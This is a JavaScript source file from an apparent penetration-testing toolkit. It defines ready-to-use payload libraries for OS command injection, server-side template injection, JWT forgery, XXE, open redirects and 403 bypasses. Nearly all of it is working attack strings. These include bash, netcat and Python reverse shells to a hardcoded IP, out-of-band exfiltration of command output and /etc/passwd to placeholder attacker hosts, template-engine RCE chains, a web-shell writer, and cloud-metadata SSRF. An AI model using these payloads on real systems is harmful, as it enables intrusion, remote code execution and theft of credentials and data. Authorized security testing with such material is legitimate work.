// RedKit · payloads/injection.js (split from payloads.js)
// ===== COMMAND INJECTION PAYLOAD LIBRARY =====
TOOLS['cmdi-payloads'] = {
  title: 'Command Injection Helper',
  desc: 'OS command injection payloads: separators, blind/time-based, OOB, and filter/WAF bypasses.',
  render() {
    const sections = [
      { name: 'Separators & Chaining', note: 'Inject after a parameter that reaches a shell', items: [
        { p: '; id', d: 'Semicolon (Unix) - run a second command' },
        { p: '| id', d: 'Pipe - feed into a new command' },
        { p: '|| id', d: 'Run only if the first command fails' },
        { p: '& id', d: 'Background / chain (Unix & Windows)' },
        { p: '&& id', d: 'Run only if the first command succeeds' },
        { p: '`id`', d: 'Backtick command substitution' },
        { p: '$(id)', d: 'Modern command substitution' },
        { p: '%0a id', d: 'URL-encoded newline injects a new line' },
        { p: '%0aid', d: 'Newline, no space' },
        { p: '{cat,/etc/passwd}', d: 'Brace expansion (no spaces needed)' },
        { p: 'a) ; id ; (', d: 'Break out of a subshell / parentheses' },
      ]},
      { name: 'Confirm (Unix)', note: 'Low-noise commands to prove execution', items: [
        { p: 'id', d: 'Current uid/gid (best single proof)' },
        { p: 'whoami', d: 'Current user' },
        { p: 'uname -a', d: 'Kernel / OS' },
        { p: 'hostname', d: 'Host name' },
        { p: 'cat /etc/passwd', d: 'User list' },
        { p: 'echo CMDI$((7*7))', d: 'Math marker (CMDI49) - safe canary' },
      ]},
      { name: 'Confirm (Windows)', items: [
        { p: 'whoami', d: 'Current user' },
        { p: 'ver', d: 'Windows version' },
        { p: 'systeminfo', d: 'Full host info' },
        { p: 'ipconfig /all', d: 'Network config' },
        { p: 'type C:\\Windows\\win.ini', d: 'Read a known file' },
        { p: 'set', d: 'Environment variables' },
      ]},
      { name: 'Blind: Time-based', note: 'No output? Make it sleep and watch the response time', items: [
        { p: '; sleep 5', d: 'Unix delay' },
        { p: '$(sleep 5)', d: 'Delay via substitution' },
        { p: '`sleep 5`', d: 'Delay via backticks' },
        { p: '| ping -c 5 127.0.0.1', d: 'Delay via ping (Unix)' },
        { p: '& ping -n 5 127.0.0.1', d: 'Delay via ping (Windows)' },
        { p: '& timeout /t 5', d: 'Windows timeout' },
        { p: '; ping -c 5 127.0.0.1 #', d: 'Comment out the rest of the line' },
      ]},
      { name: 'Blind: Out-of-Band (OAST)', note: 'True blind - exfil to a Collaborator/Interactsh host', items: [
        { p: '; curl http://OAST.example/$(whoami)', d: 'HTTP callback with output' },
        { p: '; nslookup `whoami`.OAST.example', d: 'DNS exfil (Unix)' },
        { p: '& nslookup OAST.example', d: 'DNS callback (Windows)' },
        { p: '& powershell -c "iwr http://OAST.example"', d: 'HTTP callback (Windows)' },
        { p: '; wget --post-data "x=$(id|base64)" http://OAST.example', d: 'POST exfil, base64-encoded' },
      ]},
      { name: 'Filter / WAF Bypass', note: 'Defeat space/keyword filters', items: [
        { p: 'cat${IFS}/etc/passwd', d: '${IFS} replaces spaces' },
        { p: 'cat$IFS$9/etc/passwd', d: '$IFS$9 space trick' },
        { p: '{cat,/etc/passwd}', d: 'Brace expansion (no space)' },
        { p: 'c"a"t /etc/passwd', d: 'Quotes break keyword matching' },
        { p: "c'a't /etc/passwd", d: 'Single quotes break keywords' },
        { p: 'c\\at /etc/passwd', d: 'Backslash breaks keywords' },
        { p: '/???/c?t /etc/passwd', d: 'Wildcards avoid literal binary names' },
        { p: 'who$@ami', d: '$@ is empty - splits the word' },
        { p: 'echo aWQ=|base64 -d|bash', d: 'Base64-encoded command (id)' },
        { p: 'a;b$u{cat,/etc/passwd}', d: 'Mixed obfuscation' },
      ]},
      { name: 'Argument / Parameter Injection', note: 'When input becomes a flag, not a command', items: [
        { p: '-oProxyCommand=id', d: 'ssh/scp ProxyCommand RCE' },
        { p: '--use-askpass=/tmp/x', d: 'Abuse a tool that runs a helper' },
        { p: '-o /var/www/html/sh.php', d: 'Write to an arbitrary path (curl -o)' },
        { p: '@/etc/passwd', d: 'curl/ffmpeg file read via @file' },
      ]},
      { name: 'Reverse Shell Triggers', note: 'Full generators are in the Reverse Shell tool', items: [
        { p: '; bash -i >& /dev/tcp/10.10.14.1/443 0>&1', d: 'Bash TCP reverse shell' },
        { p: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 443 >/tmp/f', d: 'Netcat mkfifo reverse shell' },
        { p: '; python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")\'', d: 'Python3 reverse shell' },
      ]},
    ];
    const tips = [
      { title: 'Always confirm', body: 'If you see no output, switch to a time-based payload (sleep 5) and watch the response time, or use an OOB/DNS callback for true blind injection.' },
      { title: 'Math canary', body: 'echo $((7*7)) printing 49 proves a shell evaluated it, with far less noise than reading sensitive files.' },
      { title: 'Spaces blocked?', body: 'Use ${IFS}, $IFS$9, brace expansion {cmd,arg}, or tabs instead of spaces.' },
    ];
    return renderPayloadLibrary('Command Injection Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== SSTI (TEMPLATE INJECTION) PAYLOAD LIBRARY =====
TOOLS['ssti-payloads'] = {
  title: 'SSTI Helper',
  desc: 'Server-Side Template Injection payloads and RCE chains for Jinja2, Twig, Freemarker, ERB and more.',
  render() {
    const sections = [
      { name: 'Detection & Polyglots', note: 'Send these first to see which syntax evaluates', items: [
        { p: '{{7*7}}', d: 'Jinja2 / Twig / Nunjucks → 49' },
        { p: '${7*7}', d: 'Freemarker / Mako / JSP EL → 49' },
        { p: '<%= 7*7 %>', d: 'ERB / EJS → 49' },
        { p: '#{7*7}', d: 'Ruby / Pug / Thymeleaf → 49' },
        { p: '*{7*7}', d: 'Thymeleaf / Spring EL → 49' },
        { p: "{{7*'7'}}", d: 'Jinja2 → 7777777, Twig → 49 (tells them apart)' },
        { p: '${{<%[%\'"}}%\\', d: 'Polyglot that errors across most engines' },
        { p: '{{ . }}', d: 'Go templates - dumps the context' },
      ]},
      { name: 'Jinja2 / Flask (Python)', note: 'Most common; many gadgets reach os', items: [
        { p: '{{config}}', d: 'Dump Flask config (often has SECRET_KEY)' },
        { p: '{{config.items()}}', d: 'Config as key/value pairs' },
        { p: '{{self.__init__.__globals__}}', d: 'Reach globals' },
        { p: "{{cycler.__init__.__globals__.os.popen('id').read()}}", d: 'RCE via cycler (clean, modern)' },
        { p: "{{lipsum.__globals__.os.popen('id').read()}}", d: 'RCE via lipsum' },
        { p: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", d: 'RCE via request object' },
        { p: "{{''.__class__.__mro__[1].__subclasses__()}}", d: 'List subclasses to find a gadget' },
        { p: "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}", d: 'Arbitrary file read' },
      ]},
      { name: 'Twig (PHP)', items: [
        { p: '{{7*7}}', d: 'Confirm (→ 49)' },
        { p: '{{_self}}', d: 'Twig template object' },
        { p: "{{['id']|filter('system')}}", d: 'RCE via filter (Twig 1.x)' },
        { p: "{{['id']|map('system')|join}}", d: 'RCE via map' },
        { p: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", d: 'RCE via undefined filter callback' },
      ]},
      { name: 'Freemarker (Java)', items: [
        { p: '${7*7}', d: 'Confirm (→ 49)' },
        { p: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', d: 'RCE via Execute' },
        { p: '${"freemarker.template.utility.Execute"?new()("id")}', d: 'One-liner Execute' },
        { p: '${product.getClass().getProtectionDomain()}', d: 'Reach the class loader' },
      ]},
      { name: 'Velocity (Java)', items: [
        { p: '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($p=$rt.getRuntime().exec("id"))$p', d: 'RCE via Runtime' },
        { p: '#set($e="exp")$e.getClass().forName("java.lang.System").getProperty("user.dir")', d: 'Read a system property' },
      ]},
      { name: 'Smarty (PHP)', items: [
        { p: '{$smarty.version}', d: 'Confirm Smarty + version' },
        { p: "{php}system('id');{/php}", d: 'RCE (Smarty < 3.1)' },
        { p: "{system('id')}", d: 'RCE if PHP functions are allowed' },
        { p: "{Smarty_Internal_Write_File::writeFile('x.php','<?php system($_GET[0]);',self::clearConfig())}", d: 'Write a web shell' },
      ]},
      { name: 'ERB / Ruby', items: [
        { p: '<%= 7*7 %>', d: 'Confirm (→ 49)' },
        { p: "<%= system('id') %>", d: 'RCE via system' },
        { p: '<%= `id` %>', d: 'RCE via backticks' },
        { p: "<%= IO.popen('id').read %>", d: 'RCE, captures output' },
        { p: "<%= File.read('/etc/passwd') %>", d: 'File read' },
      ]},
      { name: 'Mako (Python)', items: [
        { p: '${7*7}', d: 'Confirm (→ 49)' },
        { p: "<%import os%>${os.popen('id').read()}", d: 'RCE via import' },
        { p: "${self.module.cache.util.os.system('id')}", d: 'RCE via module chain' },
      ]},
      { name: 'Node (EJS / Pug / Nunjucks)', items: [
        { p: "<%= global.process.mainModule.require('child_process').execSync('id') %>", d: 'EJS RCE' },
        { p: "#{global.process.mainModule.require('child_process').execSync('id')}", d: 'Pug RCE' },
        { p: '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', d: 'Nunjucks RCE' },
      ]},
    ];
    const tips = [
      { title: 'Map before you fire', body: 'Use the detection payloads to identify the engine first - the wrong RCE gadget just errors and can lock you out of a parameter.' },
      { title: '7*7 vs 7*\'7\'', body: 'A multiplied number (49) means code execution. {{7*\'7\'}} returning 7777777 points to Jinja2, while 49 points to Twig.' },
      { title: 'Sandboxes', body: 'Many engines sandbox by default. Look for gadget chains (cycler, lipsum, request) that escape to os/Runtime.' },
    ];
    return renderPayloadLibrary('SSTI Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== JWT ATTACK HELPER =====
TOOLS['jwt-attacks'] = {
  title: 'JWT Attack Helper',
  desc: 'JSON Web Token attack techniques: alg confusion, key confusion, kid/jku injection, weak secrets.',
  render() {
    const sections = [
      { name: 'alg=none', note: 'Strip the signature entirely if the server accepts it', items: [
        { p: '{"alg":"none","typ":"JWT"}', d: 'Set alg to none, then send an empty signature.' },
        { p: '{"alg":"None","typ":"JWT"}', d: 'Case variant to dodge a naive "none" blocklist.' },
        { p: '{"alg":"nOnE","typ":"JWT"}', d: 'Mixed case bypass.' },
        { p: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.', d: 'alg=none token: header.payload. with a trailing dot and no signature.' },
      ]},
      { name: 'Key Confusion (RS256 to HS256)', note: 'Make the server verify an HMAC using the public key', items: [
        { p: '{"alg":"HS256"}', d: 'Switch the header from RS256 to HS256.' },
        { p: 'jwt_tool TOKEN -X k -pk public.pem', d: 'Sign with the RS256 public key as the HMAC secret.' },
        { p: 'openssl s_client -connect host:443 | openssl x509 -pubkey -noout', d: 'Recover the public key from TLS if not published.' },
      ]},
      { name: 'Weak HMAC Secret', note: 'Brute-force the signing key offline', items: [
        { p: 'hashcat -a 0 -m 16500 token.jwt wordlist.txt', d: 'Crack a weak HS256/384/512 secret (hashcat mode 16500).' },
        { p: 'jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt', d: 'Dictionary attack the secret with jwt_tool.' },
        { p: 'secret', d: 'Common secrets: secret, password, changeme, key, your-256-bit-secret, jwt_secret.' },
      ]},
      { name: 'kid Header Injection', note: 'kid often selects the key by path or DB lookup', items: [
        { p: '{"alg":"HS256","kid":"/dev/null"}', d: 'Point kid at an empty file, then HMAC-sign with an empty key.' },
        { p: '{"alg":"HS256","kid":"../../../../../../dev/null"}', d: 'Path traversal to a predictable/empty file.' },
        { p: '{"kid":"key\' UNION SELECT \'attacker-secret\'-- -"}', d: 'SQL injection in kid to return an attacker-known key.' },
        { p: '{"kid":"/etc/passwd"}', d: 'Use a known static file as the HMAC key.' },
        { p: '{"kid":"x|id"}', d: 'Command injection if kid is passed to a shell.' },
      ]},
      { name: 'jku / x5u / jwk Headers', note: 'Trick the server into fetching/trusting your key', items: [
        { p: '{"alg":"RS256","jku":"https://attacker.tld/jwks.json"}', d: 'Host your own JWKS and sign with the matching private key.' },
        { p: '{"alg":"RS256","jku":"https://trusted.tld@attacker.tld/jwks.json"}', d: 'jku host confusion to pass a domain allowlist.' },
        { p: '{"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}', d: 'x5u points to an attacker certificate chain.' },
        { p: '{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}', d: 'Embed your own public key in the header (if blindly trusted).' },
      ]},
      { name: 'Claim Tampering', items: [
        { p: '{"sub":"admin","role":"admin","isAdmin":true}', d: 'Escalate by editing identity/role claims (needs a sig bypass).' },
        { p: 'Remove or extend "exp"', d: 'Drop exp or push it far into the future to keep a token alive.' },
        { p: '{"aud":"other-service"}', d: 'Swap aud to reuse a token across services.' },
      ]},
      { name: 'Tooling', items: [
        { p: 'python3 jwt_tool.py TOKEN -M at', d: 'jwt_tool all-tests mode (runs every common attack).' },
        { p: 'https://github.com/ticarpi/jwt_tool', d: 'jwt_tool: all-in-one JWT attack toolkit.', link: true },
        { p: 'https://token.dev/', d: 'token.dev: quick JWT inspect/edit (or use RedKit JWT Editor).', link: true },
      ]},
    ];
    const tips = [
      { title: 'Confirm the bug', body: 'Tamper a claim and check the server actually accepts it. A 200 with changed data means the signature is not enforced.' },
      { title: 'none vs confusion', body: 'Try alg=none first (fastest), then RS256 to HS256 key confusion if the server uses RSA.' },
      { title: 'Use the JWT Editor', body: 'RedKit JWT Decoder / Editor decodes, edits and re-signs (alg=none, weak-secret) without leaving the browser.' },
    ];
    return renderPayloadLibrary('JWT Attacks', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== XXE PAYLOAD LIBRARY =====
TOOLS['xxe-payloads'] = {
  title: 'XXE Helper',
  desc: 'XML External Entity payloads: file read, SSRF, blind OOB exfiltration, and parser bypasses.',
  render() {
    const sections = [
      { name: 'Detection', note: 'Confirm the parser resolves entities', items: [
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY t "XXE-OK">]><r>&t;</r>', d: 'Internal entity; reflects XXE-OK if parsed.' },
        { p: '<!DOCTYPE x [<!ENTITY % p "test">]>', d: 'Parameter entity (building block for blind XXE).' },
      ]},
      { name: 'File Read', items: [
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]><r>&f;</r>', d: 'Read /etc/passwd.' },
        { p: '<!ENTITY f SYSTEM "file:///c:/windows/win.ini">', d: 'Windows file read.' },
        { p: '<!ENTITY f SYSTEM "file:///etc/hostname">', d: 'Quick low-risk proof file.' },
      ]},
      { name: 'PHP Wrapper (base64)', note: 'Read files with special chars / source code', items: [
        { p: '<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">', d: 'Base64-encode the file so the parser does not choke.' },
        { p: '<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=index.php">', d: 'Exfiltrate PHP source.' },
      ]},
      { name: 'SSRF via XXE', items: [
        { p: '<!ENTITY f SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">', d: 'Pivot to cloud metadata.' },
        { p: '<!ENTITY f SYSTEM "http://127.0.0.1:8080/">', d: 'Probe internal services.' },
      ]},
      { name: 'Blind / Out-of-Band', note: 'No output? Exfil via an external DTD you host', items: [
        { p: '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.tld/evil.dtd"> %ext;]>', d: 'Load a remote DTD (the request itself proves blind XXE).' },
        { p: '<!ENTITY % d SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; x SYSTEM \'http://attacker.tld/?%d;\'>">%e;%x;', d: 'evil.dtd contents: exfil file contents to your server.' },
      ]},
      { name: 'Other Vectors & Bypasses', items: [
        { p: 'Content-Type: application/xml', d: 'Switch a JSON request to XML to reach an XML parser.' },
        { p: 'SVG / DOCX / XLSX upload', d: 'Office and SVG files are ZIP+XML; embed XXE inside them.' },
        { p: '<?xml version="1.0" encoding="UTF-7"?>', d: 'UTF-7 encoding to dodge keyword filters.' },
        { p: '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><r>&lol2;</r>', d: 'Billion Laughs entity-expansion DoS (use with caution).' },
      ]},
    ];
    const tips = [
      { title: 'Blind needs OOB', body: 'When nothing reflects, host an external DTD and watch for the HTTP/DNS callback to confirm and exfil.' },
      { title: 'Try XML everywhere', body: 'Even JSON endpoints sometimes fall back to an XML parser when you change the Content-Type.' },
      { title: 'Be careful with DoS', body: 'Billion Laughs can crash the target; only run it where you are authorized and it is in scope.' },
    ];
    return renderPayloadLibrary('XXE Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== OPEN REDIRECT LIBRARY =====
TOOLS['open-redirect'] = {
  title: 'Open Redirect Helper',
  desc: 'Open redirect payloads and filter/allowlist bypasses, plus the parameters worth fuzzing.',
  render() {
    const sections = [
      { name: 'Basic', note: 'Set the redirect param to these (target = evil.com)', items: [
        { p: '//evil.com', d: 'Scheme-relative; redirects off-site.' },
        { p: 'https://evil.com', d: 'Absolute external URL.' },
        { p: '/\\evil.com', d: 'Backslash; many routers treat \\ as /.' },
        { p: '/\\/evil.com', d: 'Mixed slash variant.' },
      ]},
      { name: 'Filter Bypass', items: [
        { p: '////evil.com', d: 'Extra leading slashes.' },
        { p: 'https:evil.com', d: 'Scheme with no slashes.' },
        { p: 'https://trusted.com@evil.com', d: 'Userinfo trick; real host is evil.com.' },
        { p: '//trusted.com@evil.com', d: 'Userinfo + scheme-relative.' },
        { p: '/%2f%2fevil.com', d: 'URL-encoded slashes.' },
        { p: '/%5Cevil.com', d: 'Encoded backslash.' },
        { p: 'https://evil%E3%80%82com', d: 'Unicode full-stop as the dot.' },
      ]},
      { name: 'Allowlist Bypass', note: 'When the app checks for a trusted string', items: [
        { p: 'https://trusted.com.evil.com', d: 'Trusted name as a subdomain of evil.com.' },
        { p: 'https://evil.com/trusted.com', d: 'Trusted string placed in the path.' },
        { p: 'https://evil.com#trusted.com', d: 'Trusted string in the fragment.' },
        { p: 'https://evil.com?x=trusted.com', d: 'Trusted string in the query.' },
        { p: 'https://trusted.com.evil.com/', d: 'Subdomain trick with trailing slash.' },
      ]},
      { name: 'CRLF / Header Injection', items: [
        { p: '/%0d%0aLocation:%20https://evil.com', d: 'Inject a Location header via CRLF.' },
        { p: '/%E5%98%8D%E5%98%8ALocation:%20https://evil.com', d: 'Unicode CRLF bypass.' },
      ]},
      { name: 'Parameters to Fuzz', items: [
        { p: 'redirect, redirect_uri, redirect_url, url, next, return, returnUrl, return_to, dest, destination, continue, callback, checkout_url, goto, image_url, go, out, view, to, target', d: 'Common redirect parameter names.' },
      ]},
      { name: 'Exploitation', items: [
        { p: 'OAuth: redirect_uri=//evil.com', d: 'Steal an OAuth code/token via a loose redirect_uri.' },
        { p: 'Server-side redirect follow', d: 'If the backend follows the redirect, it becomes SSRF.' },
      ]},
    ];
    const tips = [
      { title: 'Watch where it lands', body: 'Confirm the final Location/host is attacker-controlled, not just that the URL appears in the response.' },
      { title: 'Chain it', body: 'Open redirect shines when chained: OAuth/SAML token theft, SSRF, or bypassing a redirect allowlist in another feature.' },
    ];
    return renderPayloadLibrary('Open Redirect Payloads', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

// ===== 403 / 401 BYPASS LIBRARY =====
TOOLS['forbidden-bypass'] = {
  title: '403 Bypass Helper',
  desc: 'Techniques to bypass 403/401 on a path: path tricks, header spoofing, verbs, case and encoding.',
  render() {
    const sections = [
      { name: 'Path Tricks', note: 'Target a blocked path such as /admin', items: [
        { p: '/admin/', d: 'Trailing slash.' },
        { p: '/admin/.', d: 'Dot segment.' },
        { p: '/admin//', d: 'Double slash.' },
        { p: '/./admin/..', d: 'Dot-dot dance.' },
        { p: '/admin%2f', d: 'Encoded slash.' },
        { p: '/admin/..;/', d: 'Path parameter (Tomcat / Spring).' },
        { p: '/admin..;/', d: 'Semicolon segment.' },
        { p: '/%2e/admin', d: 'Encoded dot prefix.' },
        { p: '/admin#', d: 'Fragment cut.' },
        { p: '/admin?', d: 'Empty query.' },
        { p: '/admin.json', d: 'Append an extension.' },
        { p: '/admin/.randomstring', d: 'Trailing junk segment.' },
      ]},
      { name: 'Case & Encoding', items: [
        { p: '/ADMIN', d: 'Uppercase.' },
        { p: '/Admin', d: 'Mixed case.' },
        { p: '/%61dmin', d: 'URL-encode one character.' },
        { p: '/%2561dmin', d: 'Double URL-encode.' },
        { p: '/admin%20', d: 'Trailing space.' },
        { p: '/admin%09', d: 'Trailing tab.' },
        { p: '/admin%00', d: 'Null byte.' },
      ]},
      { name: 'Header Spoofing', note: 'Add these headers to the blocked request', items: [
        { p: 'X-Original-URL: /admin', d: 'Override the path (Symfony / IIS).' },
        { p: 'X-Rewrite-URL: /admin', d: 'Override the path.' },
        { p: 'X-Forwarded-For: 127.0.0.1', d: 'Spoof source IP for internal-only rules.' },
        { p: 'X-Forwarded-Host: localhost', d: 'Spoof the host.' },
        { p: 'X-Custom-IP-Authorization: 127.0.0.1', d: 'Custom IP allowlist header.' },
        { p: 'X-Originating-IP: 127.0.0.1', d: 'IP spoof header.' },
        { p: 'X-Remote-IP: 127.0.0.1', d: 'IP spoof header.' },
        { p: 'X-Client-IP: 127.0.0.1', d: 'IP spoof header.' },
        { p: 'Referer: https://target/admin', d: 'Satisfy referer-based checks.' },
      ]},
      { name: 'Method & Protocol', items: [
        { p: 'POST /admin', d: 'Try other verbs: POST / PUT / PATCH / DELETE.' },
        { p: 'TRACE /admin', d: 'TRACE method.' },
        { p: 'X-HTTP-Method-Override: GET', d: 'Verb override header.' },
        { p: 'GET /admin HTTP/1.0', d: 'Downgrade to HTTP/1.0 (no Host).' },
      ]},
      { name: 'Tooling', items: [
        { p: 'byp4xx https://target/admin', d: 'Automated 4xx bypass (paths, headers, verbs).' },
        { p: 'nomore403 -u https://target/admin', d: 'Another 403 bypass automation tool.' },
        { p: 'https://github.com/lobuhi/byp4xx', d: 'byp4xx', link: true },
      ]},
    ];
    const tips = [
      { title: 'Diff the responses', body: 'Compare status, length and body. A 200 with the same length as the 403 is not a real bypass.' },
      { title: 'Combine tricks', body: 'Stack a path trick with a spoofed header (e.g. /admin/..;/ + X-Forwarded-For) for the best hit rate.' },
    ];
    return renderPayloadLibrary('403 / 401 Bypass', sections, tips);
  },
  init() { initPayloadLibrary(); }
};

